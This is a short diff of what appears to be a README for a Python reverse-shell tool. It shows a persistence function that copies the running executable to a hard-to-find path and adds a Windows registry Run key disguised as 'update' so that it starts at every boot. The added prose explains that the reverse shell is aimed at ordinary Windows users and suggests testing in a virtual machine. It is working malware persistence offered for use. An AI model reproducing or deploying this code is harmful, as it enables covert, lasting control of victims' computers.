@@ -41,6 +41,7 @@ def becomePersistent(self):
             shutil.copyfile(sys.executable, fileLocation)
             subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
 ```
-
+Locate the file into a hard-to-find path and runs it every time that the system turns on. In this case, the function creates a registry of the file and runs it when the machine turns on. As the reverse shell is destined to a common user, the persistent mode is made to run into Windows system (because a common user uses Windows).
+**Important:** If you want to test the persistent mode, I recommend you do it into a virtual machine to avoid some damage into your own computer.
 
 
